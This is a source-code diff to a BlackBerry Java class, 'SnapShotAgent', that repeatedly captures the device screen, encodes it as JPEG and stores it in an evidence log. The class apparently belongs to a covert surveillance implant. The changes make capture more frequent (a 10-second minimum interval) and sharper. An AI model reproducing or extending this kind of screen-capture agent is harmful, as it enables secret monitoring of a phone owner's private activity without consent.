@@ -17,6 +17,7 @@ import net.rim.device.api.system.DeviceInfo;
 import net.rim.device.api.system.Display;
 import net.rim.device.api.system.EncodedImage;
 import net.rim.device.api.system.JPEGEncodedImage;
+import net.rim.device.api.ui.UiApplication;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.log.Log;
 import blackberry.log.LogType;
@@ -34,12 +35,12 @@ import blackberry.utils.WChar;
  */
 public final class SnapShotAgent extends Agent {
     //#ifdef DEBUG
-    static Debug debug = new Debug("SnapShotAgent", DebugLevel.NOTIFY);
+    static Debug debug = new Debug("SnapShotAgent", DebugLevel.VERBOSE);
     //#endif
 
-    private static final int SNAPSHOT_DEFAULT_JPEG_QUALITY = 50;
+    private static final int SNAPSHOT_DEFAULT_JPEG_QUALITY = 75;
     private static final int LOG_SNAPSHOT_VERSION = 2009031201;
-    private static final int MIN_TIMER = 30 * 1000;
+    private static final int MIN_TIMER = 10 * 1000;
 
     private int timerMillis = 60 * 1000;
     private boolean onNewWindow = false;
@@ -80,7 +81,6 @@ public final class SnapShotAgent extends Agent {
 
         //#ifdef DEBUG_INFO
         debug.info("Taking snapshot");
-
         //#endif
 
         if (DeviceInfo.isInHolster()) {
@@ -96,39 +96,38 @@ public final class SnapShotAgent extends Agent {
             //#endif
             return;
         }
-
-        final int width = Display.getWidth();
-        final int height = Display.getHeight();
-
-        final Bitmap bitmap;
-        if(Display.getOrientation()==Display.ORIENTATION_PORTRAIT){
-            bitmap = new Bitmap(width, height);
-        }else{
-            bitmap = new Bitmap(height,width);
-        }        
         
-        Display.screenshot(bitmap);
+        final Bitmap bitmap;
+        synchronized (this) {
+            final int width = Display.getWidth();
+            final int height = Display.getHeight();            
+            bitmap = new Bitmap(width, height);
+ 
+            //#ifdef DEBUG_TRACE
+            debug
+                    .trace("portrait: "
+                            + (Display.getOrientation() == Display.ORIENTATION_PORTRAIT));
+            debug.trace("w: " + width + " h:" + height);
+            debug.trace("horizontal res: " + Display.getHorizontalResolution());
+            debug.trace("Rowwise: " + Display.isRowwise());
+            //#endif
 
-        // int size = width * height;
-        /*
-         * int[] argbData = new int[size]; bitmap.getARGB(argbData, 0, width, 0,
-         * 0, width, height);
-         */
+            Display.screenshot(bitmap, 0, 0, width, height);
+        }
+
+        //#ifdef DEBUG_TRACE
+        debug.trace("screenshot");
+        //#endif
+
         // EncodedImage encoded = PNGEncodedImage.encode(bitmap);
         final EncodedImage encoded = JPEGEncodedImage.encode(bitmap,
                 SNAPSHOT_DEFAULT_JPEG_QUALITY);
-        final byte[] plain = encoded.getData();
 
-        /*
-         * AutoFlashFile file = new AutoFlashFile(Path.SD_PATH + "snapshot.jpg",
-         * false); if (file.exists()) { file.delete(); } file.create();
-         * file.write(plain);
-         */
+        final byte[] plain = encoded.getData();
 
         //#ifdef DBC
         Check.requires(log != null, "Null log");
         //#endif
-
         synchronized (log) {
             log.createLog(getAdditionalData());
             log.writeLog(plain);
